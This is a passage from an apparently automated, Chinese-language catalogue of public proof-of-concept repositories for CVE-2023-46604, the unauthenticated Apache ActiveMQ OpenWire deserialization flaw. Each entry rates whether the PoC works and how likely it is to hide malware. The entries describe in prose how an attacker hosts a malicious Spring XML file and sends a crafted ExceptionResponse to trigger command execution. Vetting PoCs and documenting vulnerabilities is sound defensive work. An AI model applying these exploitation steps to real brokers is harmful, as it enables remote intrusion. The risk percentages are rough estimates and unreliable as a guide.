CVE-2023-46604是一个Apache ActiveMQ中的远程代码执行漏洞。攻击者可以利用OpenWire协议中的反序列化漏洞，通过发送特制的恶意数据包，使ActiveMQ Broker或Client实例化classpath中的任意类，从而执行任意代码。

**有效性分析：**

根据提供的漏洞信息和利用代码，该POC有效。漏洞库信息和搜索引擎结果都表明这是一个已公开且被广泛利用的RCE漏洞。POC代码通过构造一个包含恶意Spring Bean定义的XML文件，并利用`ClassPathXmlApplicationContext`加载该文件，从而触发代码执行。提供的代码演示了如何利用`java.lang.ProcessBuilder`来执行系统命令（打开计算器）。

**投毒风险分析：**

代码本身未发现明显的恶意投毒行为。`ClassPathXmlApplicationContext`类被修改为继承`Throwable`，看起来是为了方便在`ExceptionResponse`中使用，属于漏洞利用的一部分，不是恶意投毒。 XML 文件的内容从 http server 加载，这部分是可以人为控制的，存在替换成恶意 XML 文件的风险，但是当前提供的代码仓库本身并无明显恶意行为。但是，也不能排除作者未来添加恶意代码的可能性，只是目前的代码相对干净。 投毒风险判断为 5%。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意Bean定义的Spring XML文件，该Bean定义指定要执行的系统命令。
2.  攻击者搭建一个HTTP服务器，用于托管该XML文件。
3.  攻击者构造一个ActiveMQ OpenWire协议消息，其中包含一个`ExceptionResponse`对象，该对象的`exception`字段被设置为一个`ClassPathXmlApplicationContext`实例，该实例的构造函数参数指向攻击者托管的XML文件的URL。
4.  攻击者将该消息发送到ActiveMQ Broker。
5.  ActiveMQ Broker反序列化该消息，实例化`ClassPathXmlApplicationContext`，加载并解析XML文件，最终执行XML中定义的恶意Bean，导致RCE。

总体来说，该漏洞利用方式较为直接，依赖于Java反序列化漏洞和Spring Bean的实例化机制。由于ActiveMQ默认配置下OpenWire协议未做严格限制，攻击者可以未经身份验证地发送恶意消息，因此该漏洞的危害性极高。

**项目地址:** [trganda/ActiveMQ-RCE](https://github.com/trganda/ActiveMQ-RCE)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #24

**来源**: [CVE-2023-46604-vaishnavucv_Project-Vuln-Detection-N-Mitigation_101.md](../2023/CVE-2023-46604-vaishnavucv_Project-Vuln-Detection-N-Mitigation_101.md)

## CVE-2023-46604 - Apache ActiveMQ OpenWire 反序列化RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 反序列化RCE

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ Broker，且OpenWire协议启用（默认端口61616）。利用过程无需认证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中 Java OpenWire 协议编组器中的一个远程代码执行漏洞。攻击者可以通过操纵 OpenWire 协议中的序列化类类型，使客户端或 Broker 实例化类路径上的任何类，从而在基于 Java 的 OpenWire Broker 或客户端上执行任意 shell 命令。提供的PoC代码主要是一个安全设计项目，包含漏洞解释、检测和缓解的设计方案，而不是直接的漏洞利用代码。虽然它不直接提供exp，但描述了利用方式和检测方法，为漏洞利用提供了理论基础。

**有效性评估：**
由于该项目主要关注检测和缓解，提供的代码本身并非直接可用的exploit，但它验证了漏洞的存在和可利用性，提供思路。

**投毒风险评估：**
该项目虽然主要侧重于防御，但由于包含检测方法，可能被攻击者逆向分析用于绕过检测。漏洞库中包含外部参考packetstormsecurity，如果攻击者能够从packetstormsecurity获取漏洞，再结合项目代码，可以构造更复杂的投毒攻击。因此，投毒风险评定为10%，主要考虑是理论上攻击者可以利用防御方案来优化攻击。

**漏洞利用方式：**
1.  **攻击向量：** 通过网络访问 ActiveMQ Broker 的 OpenWire 端口 (61616)。
2.  **漏洞触发：** 发送特制的 OpenWire 消息，其中包含恶意序列化的 Java 对象。
3.  **利用原理：** ActiveMQ 在反序列化过程中，由于没有充分的类型验证，会实例化攻击者指定的类。
4.  **代码执行：** 攻击者可以利用已知的 Java 反序列化漏洞链（如 Commons Collections），或者直接利用存在于 ActiveMQ 类路径上的危险类，来执行任意代码。
5.  **无需认证：** 此漏洞无需任何身份验证，任何能访问 OpenWire 端口的攻击者都可以利用。

**缓解措施：**
升级到 5.15.16、5.16.7、5.17.6 或 5.18.3 及更高版本是最佳的缓解方法。还可以通过网络策略限制对 OpenWire 端口的访问，并考虑禁用 OpenWire 协议。

**项目地址:** [vaishnavucv/Project-Vuln-Detection-N-Mitigation_101](https://github.com/vaishnavucv/Project-Vuln-Detection-N-Mitigation_101)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #25

**来源**: [CVE-2023-46604-vjayant93_CVE-2023-46604-POC.md](../2023/CVE-2023-46604-vjayant93_CVE-2023-46604-POC.md)

## CVE-2023-46604-Apache ActiveMQ RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 5.15.16之前, 5.16.7之前, 5.17.6之前, 5.18.3之前

**利用条件:** 需要网络访问 ActiveMQ Broker 或 Client

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-46604是Apache ActiveMQ中的一个远程代码执行漏洞。该漏洞源于Java OpenWire协议marshaller对不可信数据进行反序列化。攻击者可以通过操纵OpenWire协议中的序列化类类型，使broker或client实例化classpath上的任何类，从而执行任意shell命令。

**有效性分析：**
提供的POC代码`poc.xml` 使用 Spring Beans 的 `ProcessBuilder` 来执行命令。 它通过 `<bean>` 标签定义了一个 `ProcessBuilder` 实例，并使用 `init-method="start"` 指示 Spring 在 bean 初始化时启动该进程。 `constructor-arg` 包含了要执行的命令列表，示例中是打开计算器应用程序（MacOS）。因此，如果 ActiveMQ Broker 或者 Client 使用了受影响的版本，并且能够加载并解析该XML配置，这个POC能够成功触发RCE。

**投毒风险分析：**
查看提供的poc.xml文件，该文件旨在通过Spring Beans配置启动计算器程序。没有发现任何恶意或隐藏的代码。`/tmp/0bd050d52d14911a8492fc0b3a9ab6cc/README.md`只是描述了POC，也没有任何投毒代码。因此，可以认为此POC代码的投毒风险很低，为0%。

**利用方式：**
根据漏洞信息和POC代码，利用方式如下：

1.  攻击者需要能够通过网络访问运行Java OpenWire协议的 ActiveMQ broker 或 client。
2.  攻击者构造恶意的OpenWire消息，该消息包含对恶意Spring XML配置的引用或直接包含恶意的Spring XML配置。这个XML配置利用了`java.lang.ProcessBuilder`或其他可以执行命令的类。
3.  ActiveMQ broker 或 client 反序列化该消息，从而实例化并执行XML配置中指定的命令，导致远程代码执行。

**搜索引擎结果分析：**
根据搜索结果，CVE-2023-46604已经被广泛利用，并被用于传播恶意软件，例如 Kinsing 和勒索软件。这表明该漏洞具有很高的现实风险。

**项目地址:** [vjayant93/CVE-2023-46604-POC](https://github.com/vjayant93/CVE-2023-46604-POC)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #26

**来源**: [CVE-2023-46604-vulncheck-oss_cve-2023-46604.md](../2023/CVE-2023-46604-vulncheck-oss_cve-2023-46604.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ的OpenWire协议端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-46604是Apache ActiveMQ中的一个远程代码执行漏洞，存在于Java OpenWire协议marshaller中。攻击者可以通过网络访问Java-based OpenWire broker或client，通过操纵OpenWire协议中的序列化类类型，导致client或broker（相应地）实例化classpath上的任何类，从而执行任意shell命令。

**有效性：**根据漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果表明该漏洞已经被积极利用，导致Kinsing恶意软件和勒索软件感染。

**投毒风险：** 提供的Dockerfile仅仅描述了如何编译和运行利用代码，LICENSE文件是Apache协议。提供的 exploit 示例较为简略，主要目的是利用漏洞，并无发现明显的恶意投毒代码。因此，判断投毒风险为0%。

**利用方式：** 攻击者利用此漏洞，通过发送特制的恶意序列化数据到ActiveMQ broker，broker在反序列化这些数据时，会加载并实例化攻击者指定的类，从而执行任意代码。这些类可以是攻击者构造的恶意类，也可以是broker classpath上已存在的类。常见利用方式是通过加载`org.springframework.context.support.ClassPathXmlApplicationContext`类，利用Spring的特性来执行代码。攻击者可以在XML配置文件中指定要执行的命令。由于是反序列化漏洞，常见的利用链如`CommonsCollections`也可能被利用。

**项目地址:** [vulncheck-oss/cve-2023-46604](https://github.com/vulncheck-oss/cve-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

